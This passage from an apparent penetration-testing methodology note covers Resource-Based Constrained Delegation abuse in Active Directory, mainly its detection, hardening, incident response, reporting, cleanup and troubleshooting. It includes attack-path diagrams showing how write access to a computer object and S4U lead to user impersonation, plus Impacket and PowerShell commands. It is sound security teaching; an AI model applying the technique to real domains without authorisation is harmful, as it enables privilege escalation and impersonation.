Defenders should determine:

```text
Who modified the RBCD attribute?

Which target object changed?

Which principal was added?

Was that principal recently created?

Who created the principal?

Which user was represented?

Which service ticket was requested?

Which backend service was accessed?

Was the user privileged?

Was the change authorised?

Was the RBCD entry removed?
```

---

# Purple Team Metrics

Useful metrics include:

```text
Time to detect computer creation
Time to detect RBCD change
Time to identify modifying user
Time to resolve added SID
Time to detect S4U activity
Time to identify represented user
Time to identify target service
Time to containment
Correct attack-chain reconstruction?
Correct remediation?
```

---

# Hardening

The defensive model is:

```text
RBCD
 |
 +--> Restrict Computer Object Writes
 |
 +--> Restrict RBCD Attribute Changes
 |
 +--> Review MachineAccountQuota
 |
 +--> Protect Computer Creation
 |
 +--> Protect Privileged Users
 |
 +--> Harden Target Services
 |
 +--> Monitor AD Changes
 |
 +--> Monitor Kerberos
```

---

# Restrict Computer Object Permissions

Review who can modify computer objects.

Pay particular attention to:

```text
GenericAll
GenericWrite
WriteProperty
WriteDACL
WriteOwner
```

Remove permissions that are not operationally required.

---

# Protect RBCD Attribute

Changes to:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

should be limited to appropriate administrative identities and processes.

Delegation changes should follow controlled change-management procedures.

---

# Review Machine Account Quota

Determine the actual business requirement for:

```text
ms-DS-MachineAccountQuota
```

If ordinary users do not need the ability to create computer accounts, organisations can consider reducing the quota, including potentially setting it to:

```text
0
```

after compatibility and provisioning-process review.

Do not treat changing the quota as a complete RBCD mitigation.

---

# Machine Account Quota Is Only One Control

Even with:

```text
MachineAccountQuota = 0
```

RBCD can still be relevant if an attacker already controls:

```text
Existing Computer Account
Service Principal
Other Suitable Security Principal
```

Therefore:

```text
MAQ = 0
```

does not mean:

```text
RBCD impossible
```

---

# Secure Computer Provisioning

Use controlled mechanisms for joining computers to the domain.

Examples include:

```text
Dedicated provisioning identities
Restricted OU permissions
Automated deployment workflows
Audited administrative processes
```

Avoid unnecessary domain-wide computer-creation rights.

---

# Protect Privileged Accounts

Use:

```text
Account is sensitive and cannot be delegated
```

for suitable high-value identities.

Also consider:

```text
Protected Users
Administrative tiering
Privileged Access Workstations
```

where appropriate.

---

# Administrative Tiering

Avoid:

```text
Tier 0 Administrator
       |
       v
Lower-Tier Server
```

where possible.

A safer model is:

```text
Tier 0 Administrator
       |
       v
PAW
       |
       v
Tier 0
```

This reduces the value of delegation paths involving lower-tier resources.

---

# Target Service Hardening

Even where a valid ticket exists:

```text
Authentication
      |
      v
Service
```

network and service-level controls still matter.

Apply:

```text
Least privilege
Network segmentation
Restricted administration
Firewalling
Application control
EDR
```

---

# Protect ACL Administration

Delegation hardening should include ACL governance.

Review:

```text
Who owns computer objects?
Who can modify DACLs?
Who can write properties?
Which permissions are inherited?
Which OUs delegate computer management?
```

Many RBCD paths originate from excessive object-management permissions rather than an intentionally configured delegation relationship.

---

# Incident Response

If malicious RBCD is suspected:

```text
RBCD Detected
    |
    v
Preserve AD Evidence
    |
    v
Identify Modified Resource
    |
    v
Identify Added Principal
    |
    v
Identify Modifying Account
    |
    v
Identify Principal Creation
    |
    v
Review 4768 / 4769
    |
    v
Identify Represented Users
    |
    v
Review Target Authentication
    |
    v
Remove Malicious Delegation
    |
    v
Rotate Compromised Credentials
    |
    v
Repair ACL Root Cause
    |
    v
Hunt for Lateral Movement
```

---

# Investigate Root Cause

Do not stop after removing:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Determine how the attacker gained write access.

Possible causes include:

```text
GenericAll
GenericWrite
WriteDACL
WriteOwner
Compromised administrator
Over-permissive OU delegation
Misconfigured provisioning account
```

---

# Computer Account Cleanup

If a malicious or test computer was created:

```text
Computer Account
       |
       v
Preserve Evidence
       |
       v
Determine Dependencies
       |
       v
Disable / Delete
       |
       v
Hunt for Authentication
```

For penetration testing, remove only objects created by the test unless explicitly authorised otherwise.

---

# Reporting

Possible finding titles include:

```text
Resource-Based Constrained Delegation Enables User Impersonation
```

```text
Excessive Computer Object Permissions Permit RBCD Abuse
```

```text
GenericWrite over Computer Object Enables Kerberos Delegation Abuse
```

```text
Resource-Based Constrained Delegation Creates Privilege Escalation Path
```

```text
Unprivileged Principal Can Configure Kerberos Delegation on Server
```

---

# Root Cause Reporting

Where RBCD was enabled because of excessive ACL permissions, the root cause should usually be reflected in the finding.

For example:

```text
Excessive Active Directory Permissions Permit RBCD Abuse
```

may be more accurate than simply:

```text
RBCD Vulnerability
```

The important security weakness is often:

```text
Attacker can modify
sensitive computer object
```

RBCD is the mechanism used to turn that control into authentication impact.

---

# Severity

Severity should consider:

```text
Can attacker modify target?
        |
        v
Can attacker control principal?
        |
        v
Which target service?
        |
        v
Which user can be represented?
        |
        v
What privileges does user have?
        |
        v
Is target Tier 0?
```

Example:

```text
GenericWrite over
low-value workstation
```

may present a different impact from:

```text
GenericWrite over
sensitive management server
```

or:

```text
Writable computer object
associated with Tier 0 infrastructure
```

---

# Example Finding

```text
Finding:
Excessive Computer Object Permissions Permit Resource-Based
Constrained Delegation Abuse

Affected Object:
SERVER01$

Affected Principal:
CORP\alice

Description:
The CORP\alice account has permissions over the SERVER01 computer
object that allow modification of security-sensitive Active Directory
properties.

These permissions can be used to configure the
msDS-AllowedToActOnBehalfOfOtherIdentity attribute and cause SERVER01
to trust an attacker-controlled Kerberos principal for resource-based
constrained delegation.

During controlled validation, a dedicated test computer account was
configured as an authorised delegating principal for SERVER01.

Using the test principal, a Kerberos service ticket representing a
dedicated test user was requested for the authorised CIFS service and
used to authenticate successfully.

No remote command execution or production administrator impersonation
was required.

Impact:
An attacker who obtains the affected Active Directory permissions may
be able to establish a Kerberos delegation relationship and impersonate
users to services hosted by SERVER01.

The resulting impact depends on the permissions held by the represented
user on the target service.

Recommendation:
Remove unnecessary write permissions over the SERVER01 computer object.

Restrict modification of
msDS-AllowedToActOnBehalfOfOtherIdentity to approved administrative
processes, review delegated OU permissions, monitor changes to RBCD
configuration, review computer-account creation rights, and protect
privileged identities from unnecessary delegation.

The test RBCD relationship and dedicated computer object should be
removed after validation.
```

---

# Evidence Collection

Record:

```text
Target Computer
Target DN
Target SID
Target SPNs
Original RBCD Attribute
Trusted Delegating Principal
Delegating Principal SID
Delegating Principal Type
Delegating Principal Creation Time
MachineAccountQuota
Modifying Principal
ACL Right
Object Owner
Impersonated Test User
Requested SPN
Ticket Principal
Ticket Lifetime
Authentication Result
Relevant Event IDs
Tool
Command
Timestamp
Cleanup Status
```

---

# Evidence Redaction

Treat the following as credentials:

```text
Computer Password
NT Hash
AES Key
TGT
Service Ticket
.ccache
.kirbi
```

Never include reusable material in public reports.

Use:

```text
[REDACTED]
```

where appropriate.

---

# Capture Original State

Before any authorised modification, record:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

exactly as it exists.

Also record:

```text
Existing Trusted Principals
Target ACL
Object Owner
```

This is essential for safe cleanup.

---

# Cleanup Strategy

The cleanup model is:

```text
Test Complete
    |
    v
Remove Test RBCD Entry
    |
    v
Verify Legitimate Entries Remain
    |
    v
Remove Test Computer
    |
    v
Remove Ticket Cache
    |
    v
Verify AD State
```

---

# Remove RBCD Test Configuration

Use the same tool and documented original state to remove only the test relationship.

Before any removal:

```bash
impacket-rbcd \
    -delegate-to 'SERVER01$' \
    -action read \
    'corp.example/alice:<PASSWORD>'
```

Verify exactly what is configured.

Do not clear legitimate production relationships.

---

# Remove Test Computer

If a dedicated test computer was created and no longer required, remove it using an approved Active Directory administration method.

For example, from authorised Windows administration:

```powershell
Remove-ADComputer \
    -Identity 'PT-RBCD' \
    -Confirm:$true
```

Verify first:

```powershell
Get-ADComputer \
    -Identity 'PT-RBCD' \
    -Properties *
```

Never delete a computer object solely because its name resembles the test naming convention.

---

# Ticket Cleanup

Linux:

```bash
unset KRB5CCNAME
```

Where appropriate:

```bash
kdestroy
```

Remove temporary ticket files according to the engagement's evidence policy:

```bash
rm -f <TICKET>.ccache
```

Windows dedicated test session:

```powershell
klist
```

and, where appropriate:

```powershell
klist purge
```

---

# Verify Cleanup

After cleanup, repeat enumeration.

PowerShell:

```powershell
Get-ADComputer \
    -Identity 'SERVER01' \
    -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select-Object \
        Name,
        msDS-AllowedToActOnBehalfOfOtherIdentity
```

Then verify the test computer no longer exists if it was intended to be removed.

---

# Troubleshooting

## No RBCD Relationships Found

Possible reasons:

```text
RBCD not configured

LDAP search incorrect

Insufficient directory access

Wrong search base

Wrong domain
```

Cross-check with:

```text
PowerShell
Impacket
BloodHound
LDAP
```

---

# RBCD Attribute Appears Binary

This is expected.

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

contains a security descriptor.

Use:

```text
PowerShell security-descriptor parsing
Impacket
BloodHound
```

to resolve the trusted principals.

---

# Cannot Create Computer Account

Check:

```text
MachineAccountQuota
        |
        +
Effective permissions
        |
        +
OU restrictions
        |
        +
Domain policy
```

Do not assume:

```text
MAQ > 0
```

guarantees every creation workflow will succeed.

---

# addcomputer Fails

Check:

```bash
impacket-addcomputer -h
```

Then verify:

```text
Domain
Credentials
Computer name
Password
DC IP
DNS
Permissions
MachineAccountQuota
```

---

# Cannot Modify RBCD

The user may not actually have the required effective write permission.

Validate:

```text
ACL
Inheritance
Object Type
Attribute Write Rights
Owner
DACL
```

Do not assume a graph path is exploitable without confirming the effective permission.

---

# rbcd Tool Fails

Check:

```bash
impacket-rbcd -h
```

Then verify:

```text
delegate-from
delegate-to
Domain
Credential format
Target object
DC
LDAP connectivity
Permissions
```

---

# getST Fails

Check:

```bash
impacket-getST -h
```

Then verify:

```text
Controlled principal credential
RBCD relationship
Target SPN
Target user
DNS
Time
KDC connectivity
```

---

# KDC_ERR_S_PRINCIPAL_UNKNOWN

Check the requested SPN:

```powershell
setspn -Q cifs/server01.corp.example
```

Verify:

```text
Service class
Hostname
FQDN
Port where applicable
SPN registration
```

---

# KDC_ERR_BADOPTION

This may indicate that the requested delegation operation is not permitted under the current ticket or delegation configuration.

Review:

```text
S4U flow
Delegation type
Target SPN
User delegation protection
Ticket properties
```

---

# KDC_ERR_ETYPE_NOSUPP

Check:

```text
Kerberos encryption types
Account keys
Domain policy
Tool configuration
```

Do not enable deprecated encryption merely to make a proof of concept succeed.

---

# Clock Skew

Linux:

```bash
date
```

Windows:

```powershell
w32tm /query /status
```

Kerberos failures frequently originate from incorrect time.

---

# Ticket Exists but Authentication Fails

Inspect:

```bash
klist
```

Check:

```text
Client
Service
Realm
Expiration
```

Then confirm:

```text
DNS
FQDN
SPN
Service availability
User authorisation
```

---

# Authentication Succeeds but Access Is Denied

Remember:

```text
Authentication
      !=
Authorisation
```

The represented user may not have permission to perform the desired service operation.

This can still prove that RBCD impersonation succeeded.

---

# Target User Is Protected

Check:

```powershell
Get-ADUser \
    -Identity '<USERNAME>' \
    -Properties AccountNotDelegated
```

Also review:

```text
Protected Users
```

Do not weaken those protections for testing.

---

# BloodHound Shows Path but RBCD Fails

BloodHound provides graph-based attack-path analysis.

It does not replace effective-permission validation.

Confirm:

```text
Exact ACE
Inheritance
Object type
Attribute
Current principal
Target object
```

---

# Common Mistakes

## Mistake 1 - Confusing KCD and RBCD

```text
KCD
 |
 v
Delegator defines destination


RBCD
 |
 v
Resource defines delegator
```

---

## Mistake 2 - Looking for msDS-AllowedToDelegateTo

RBCD uses:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

not:

```text
msDS-AllowedToDelegateTo
```

---

## Mistake 3 - Treating the RBCD Attribute as a String List

It contains:

```text
Security Descriptor
```

with SIDs and access-control information.

---

## Mistake 4 - Assuming MachineAccountQuota Is the Vulnerability

Machine account creation and RBCD modification are separate conditions.

---

## Mistake 5 - Creating a Computer When One Is Already Controlled

Prefer the minimum-change path.

---

## Mistake 6 - Modifying Production AD Without Approval

RBCD testing may change a security-sensitive Active Directory attribute.

Obtain explicit authorisation.

---

## Mistake 7 - Failing to Record Original State

This can cause legitimate delegation entries to be destroyed during cleanup.

---

## Mistake 8 - Clearing the Entire RBCD Attribute

Remove only the test relationship unless the engagement explicitly requires otherwise.

---

## Mistake 9 - Using a Domain Admin for Initial Testing

A dedicated test user usually demonstrates the mechanism safely.

---

## Mistake 10 - Confusing Authentication with Authorisation

A valid service ticket does not automatically provide administrative permissions.

---

## Mistake 11 - Ignoring ACL Root Cause

The real vulnerability may be:

```text
GenericWrite over SERVER01$
```

rather than RBCD itself.

---

## Mistake 12 - Ignoring WriteDACL and WriteOwner

Indirect ACL-control chains can ultimately provide the attribute write needed for RBCD.

---

## Mistake 13 - Ignoring Existing RBCD

An already configured relationship may remove the need for any AD modification.

---

## Mistake 14 - Ignoring Target SPNs

The requested ticket must correspond to an actual relevant service.

---

## Mistake 15 - Using IP Addresses for Kerberos

Prefer the FQDN represented by the SPN.

---

## Mistake 16 - Ignoring DNS and Time

Always troubleshoot:

```text
DNS
Time
Realm
KDC
SPN
Ticket
```

---

## Mistake 17 - Leaving Test Computer Accounts

Every created object must be tracked and removed when appropriate.

---

## Mistake 18 - Leaving RBCD Configuration

Temporary delegation is a security-sensitive change.

Verify cleanup.

---

## Mistake 19 - Leaving Tickets on Disk

`.ccache` and `.kirbi` files are credentials.

---

## Mistake 20 - Calling Every Writable Computer Critical

Impact depends on:

```text
Target
Services
User Privileges
Reachability
Existing Controls
```

---

# Assessment Checklist

## Preparation

- [ ] Confirm RBCD testing is authorised
- [ ] Confirm Active Directory modifications are allowed
- [ ] Confirm computer creation is allowed
- [ ] Confirm permitted target systems
- [ ] Confirm permitted test users
- [ ] Confirm permitted services
- [ ] Confirm cleanup requirements
- [ ] Identify domain controller
- [ ] Verify DNS
- [ ] Verify time

## Existing RBCD Enumeration

- [ ] Query `msDS-AllowedToActOnBehalfOfOtherIdentity`
- [ ] Enumerate computer objects
- [ ] Parse RBCD security descriptors
- [ ] Resolve trusted SIDs
- [ ] Identify trusted principals
- [ ] Determine whether any trusted principal is controlled
- [ ] Run `impacket-findDelegation`
- [ ] Compare BloodHound data

## ACL Enumeration

- [ ] Identify writable computer objects
- [ ] Review `GenericAll`
- [ ] Review `GenericWrite`
- [ ] Review `WriteProperty`
- [ ] Review `WriteDACL`
- [ ] Review `WriteOwner`
- [ ] Review object owner
- [ ] Review inherited permissions
- [ ] Confirm effective attribute-write capability

## Principal Analysis

- [ ] Identify existing controlled principals
- [ ] Prefer existing test principal
- [ ] Determine whether computer creation is necessary
- [ ] Check `ms-DS-MachineAccountQuota`
- [ ] Record any created computer
- [ ] Protect principal credentials

## Target Analysis

- [ ] Enumerate target SPNs
- [ ] Identify target services
- [ ] Identify target tier
- [ ] Determine network reachability
- [ ] Determine represented-user privileges
- [ ] Review sensitive-account protections

## Before Modification

- [ ] Capture original RBCD attribute
- [ ] Resolve existing trusted principals
- [ ] Capture target ACL
- [ ] Capture object owner
- [ ] Record timestamp
- [ ] Confirm cleanup procedure
- [ ] Confirm test principal

## Controlled Validation

- [ ] Add only dedicated test relationship
- [ ] Read attribute after modification
- [ ] Request one required service ticket
- [ ] Use dedicated test user where possible
- [ ] Inspect ticket with `klist`
- [ ] Validate authentication only where sufficient
- [ ] Avoid unnecessary remote execution
- [ ] Stop after impact is demonstrated

## Detection

- [ ] Review 5136
- [ ] Review 4741
- [ ] Review 4742 where relevant
- [ ] Review 4768
- [ ] Review 4769
- [ ] Review 4624
- [ ] Review 4672 where relevant
- [ ] Correlate AD changes with Kerberos activity
- [ ] Monitor computer creation
- [ ] Monitor sensitive ACL changes

## Remediation

- [ ] Remove excessive computer-object rights
- [ ] Restrict RBCD attribute modification
- [ ] Review OU delegation
- [ ] Review MachineAccountQuota
- [ ] Secure computer provisioning
- [ ] Protect privileged identities
- [ ] Apply administrative tiering
- [ ] Harden target services
- [ ] Segment sensitive systems
- [ ] Baseline legitimate RBCD

## Cleanup

- [ ] Remove test RBCD relationship
- [ ] Preserve legitimate RBCD entries
- [ ] Verify RBCD attribute
- [ ] Remove dedicated test computer
- [ ] Verify test computer removal
- [ ] Unset `KRB5CCNAME`
- [ ] Destroy temporary ticket cache
- [ ] Remove `.ccache`
- [ ] Remove `.kirbi`
- [ ] Secure retained evidence
- [ ] Verify final Active Directory state

---

# RBCD Testing Model

The trust model is:

```text
                   Traditional KCD

               Front-End Principal
                       |
                       v
              Where may I delegate?
                       |
                       v
             msDS-AllowedToDelegateTo
                       |
                       v
                  Back-End


                         RBCD

                    Back-End
                       |
                       v
             Who may delegate to me?
                       |
                       v
msDS-AllowedToActOnBehalfOfOtherIdentity
                       |
                       v
               Front-End Principal
```

The configuration model is:

```text
                  SERVER01$
                      |
                      v
msDS-AllowedToActOnBehalfOfOtherIdentity
                      |
                      v
              Security Descriptor
                      |
                      v
                     ACE
                      |
                      v
                     SID
                      |
                      v
                  PT-RBCD$
```

The S4U model is:

```text
                  Controlled Principal
                          |
                          v
                         KDC
                          |
                          | S4U2Self
                          v
                 User Representation
                          |
                          | S4U2Proxy
                          v
                         KDC
                          |
                          v
                Target Service Ticket
                          |
                          v
                       Resource
```

The ACL attack model is:

```text
Low-Privilege User
       |
       v
Write Permission
       |
       v
Target Computer Object
       |
       v
Modify RBCD Attribute
       |
       v
Trust Controlled Principal
       |
       v
S4U
       |
       v
Impersonate User
       |
       v
Target Service
```

The MachineAccountQuota model is:

```text
Authenticated User
       |
       v
MachineAccountQuota
       |
       v
Create Computer Principal
       |
       v
Control Computer Credential
       |
       +
Write Target Computer
       |
       v
Configure RBCD
       |
       v
S4U
       |
       v
Target Service
```

The important distinction is:

```text
MachineAccountQuota
        |
        X
RBCD by itself


Writable Target
        |
        X
Complete RBCD path by itself


Controlled Principal
        |
        X
Complete RBCD path by itself
```

The complete path is:

```text
Controlled Principal
        +
Write Target Resource
        +
RBCD Configuration
        +
Kerberos Connectivity
        +
Suitable Target SPN
        +
Representable User
        |
        v
Potential Service Impersonation
```

The detection model is:

```text
Computer Creation
     4741
       |
       v
RBCD Modification
     5136
       |
       v
Kerberos TGT
     4768
       |
       v
Service Ticket
     4769
       |
       v
Target Logon
     4624
```

The defensive model is:

```text
RBCD Risk
   |
   +--> Restrict Computer Writes
   |
   +--> Restrict RBCD Attribute
   |
   +--> Review MachineAccountQuota
   |
   +--> Secure Computer Provisioning
   |
   +--> Protect Privileged Users
   |
   +--> Administrative Tiering
   |
   +--> Segment Services
   |
   +--> Monitor 5136
   |
   +--> Monitor 4741
   |
   +--> Monitor Kerberos
   |
   +--> Baseline Legitimate RBCD
```

A mature assessment should answer:

```text
Which resources already use RBCD?
        |
        v
Which principals are trusted?
        |
        v
Do we control any of them?
        |
        v
Which computer objects are writable?
        |
        v
What exact ACL permits the write?
        |
        v
Can a suitable principal be controlled?
        |
        v
Is computer creation necessary?
        |
        v
What is MachineAccountQuota?
        |
        v
Which services exist on the target?
        |
        v
Which users can safely be represented?
        |
        v
What permissions would they have?
        |
        v
Can defenders detect the AD change?
        |
        v
Can defenders correlate it with S4U?
        |
        v
Can the ACL root cause be removed?
```

---

# Related Notes

Active Directory methodology:

[Active Directory Penetration Testing Methodology](methodology.md)

Active Directory enumeration:

[Active Directory Enumeration](enumeration.md)

Kerberos:

[Kerberos](kerberos.md)

Kerberos tickets:

[Kerberos Tickets](kerberos-tickets.md)

Constrained Delegation:

[Constrained Delegation](constrained-delegation.md)

Unconstrained Delegation:

[Unconstrained Delegation](unconstrained-delegation.md)

Pass-the-Ticket:

[Pass-the-Ticket](pass-the-ticket.md)

Pass-the-Key:

[Pass-the-Key](pass-the-key.md)

OverPass-the-Hash:

[OverPass-the-Hash](overpass-the-hash.md)

Kerberoasting:

[Kerberoasting](kerberoasting.md)

BloodHound:

[BloodHound](bloodhound.md)

Impacket:

[Impacket](impacket.md)

NetExec:

[NetExec](netexec.md)

The following topics complement RBCD and can be linked once their dedicated notes are available:

```text
active-directory/s4u.md
active-directory/acl-ace.md
active-directory/machine-account-quota.md
active-directory/shadow-credentials.md
active-directory/authentication-coercion.md
active-directory/lateral-movement.md
```

---

# References

## Microsoft RBCD and Kerberos Delegation

[Microsoft - Kerberos Constrained Delegation Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview){ target="_blank" rel="noopener noreferrer" }

[Microsoft - Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/){ target="_blank" rel="noopener noreferrer" }

[Microsoft - Service for User and Constrained Delegation Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/){ target="_blank" rel="noopener noreferrer" }

---

## RBCD Attribute

[Microsoft - msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity){ target="_blank" rel="noopener noreferrer" }

---

## Machine Account Quota

[Microsoft - ms-DS-Machine-Account-Quota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota){ target="_blank" rel="noopener noreferrer" }

---

## Account Protection

[Microsoft - Protected Users security group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group){ target="_blank" rel="noopener noreferrer" }

[Microsoft - ADS_USER_FLAG_ENUM](https://learn.microsoft.com/en-us/windows/win32/api/iads/ne-iads-ads_user_flag_enum){ target="_blank" rel="noopener noreferrer" }

---

## Auditing

[Microsoft - Event 4741](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4741){ target="_blank" rel="noopener noreferrer" }

[Microsoft - Event 4768](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768){ target="_blank" rel="noopener noreferrer" }

[Microsoft - Event 4769](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769){ target="_blank" rel="noopener noreferrer" }

[Microsoft - Event 5136](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5136){ target="_blank" rel="noopener noreferrer" }

---

## MITRE ATT&CK

[MITRE ATT&CK - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/){ target="_blank" rel="noopener noreferrer" }

[MITRE ATT&CK - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/){ target="_blank" rel="noopener noreferrer" }

[MITRE ATT&CK - Account Manipulation](https://attack.mitre.org/techniques/T1098/){ target="_blank" rel="noopener noreferrer" }

---

## Impacket

[Fortra Impacket](https://github.com/fortra/impacket){ target="_blank" rel="noopener noreferrer" }

[Impacket findDelegation](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py){ target="_blank" rel="noopener noreferrer" }

[Impacket rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py){ target="_blank" rel="noopener noreferrer" }

[Impacket getST](https://github.com/fortra/impacket/blob/master/examples/getST.py){ target="_blank" rel="noopener noreferrer" }

[Impacket addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py){ target="_blank" rel="noopener noreferrer" }

---

## BloodHound

[BloodHound Documentation](https://bloodhound.specterops.io/){ target="_blank" rel="noopener noreferrer" }

---

## NetExec

[NetExec Documentation](https://www.netexec.wiki/){ target="_blank" rel="noopener noreferrer" }

---

# Final Notes

Resource-Based Constrained Delegation reverses the traditional Kerberos delegation trust relationship.

Traditional constrained delegation asks:

```text
Where may this service delegate?
```

RBCD asks:

```text
Who may delegate to this resource?
```

The defining attribute is:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

stored on the target resource.

The basic relationship is:

```text
Target Resource
      |
      v
RBCD Security Descriptor
      |
      v
Trusted Delegating Principal
```

The important offensive-security relationship is:

```text
Write Access to Target
        |
        +
Controlled Kerberos Principal
        |
        v
Configure RBCD
        |
        v
S4U
        |
        v
User Impersonation
        |
        v
Target Service
```

RBCD therefore sits at the intersection of:

```text
Active Directory ACLs
        +
Computer Accounts
        +
Kerberos Delegation
        +
S4U
        +
Service Authentication
```

Machine Account Quota can sometimes provide the controlled principal:

```text
MachineAccountQuota
       |
       v
Create Computer
       |
       v
Control Kerberos Principal
```

but:

```text
MachineAccountQuota
       !=
RBCD Vulnerability
```

The decisive question remains:

```text
Can the attacker modify the
target resource's delegation
configuration?
```

A mature assessment should therefore begin with:

```text
Existing RBCD Enumeration
        |
        v
ACL Analysis
        |
        v
Controlled Principal Analysis
        |
        v
Target SPN Analysis
        |
        v
Minimum-Impact S4U Validation
        |
        v
Detection Validation
        |
        v
Exact Cleanup
```

The most important operational requirement during active testing is cleanup.

Before modifying RBCD:

```text
Record Original State
```

After testing:

```text
Remove Test Relationship
        |
        v
Preserve Legitimate Relationships
        |
        v
Remove Test Principal
        |
        v
Remove Ticket Material
        |
        v
Verify Active Directory State
```

Finally, RBCD should usually be reported as part of the complete attack path.

Instead of:

```text
RBCD is enabled
```

determine:

```text
Which principal has excessive rights?
        |
        v
Which resource can be modified?
        |
        v
Which principal can be controlled?
        |
        v
Which user can be represented?
        |
        v
Which service is reachable?
        |
        v
What privileges result?
```

That produces a finding based on the actual security boundary and demonstrated impact rather than simply the existence of a legitimate Kerberos feature.
